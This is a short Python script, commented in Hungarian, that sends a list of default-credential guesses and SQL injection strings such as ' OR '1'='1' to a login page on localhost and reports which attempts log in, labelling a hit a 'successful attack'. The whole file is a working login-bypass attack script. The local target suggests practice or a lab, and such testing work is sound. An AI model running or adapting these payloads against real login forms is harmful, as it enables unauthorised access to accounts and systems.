import requests

url = "http://localhost:3000/login.php"

payloads = [
    ("admin", "admin"),
    ("admin", "admin_password"),
    ("admin' -- ", ""),
    ("' OR '1'='1' or '1'='1", "")
]

for username, password in payloads:
  response = requests.post(
    url, 
    data={
        'username': username, 
        'password': password
        })

  # Ellenőrizzük a választ tartalmát:
  if "Sikeres bejelentkezés" in response.text:
    print(f"Sikeres támadás: {username} - {password}")
  elif "error" in response.text.lower():
    print(f"Hiba a támadás során: {username} - {password}")
  else:
    print(f"Nem működött   : {username} - {password}")

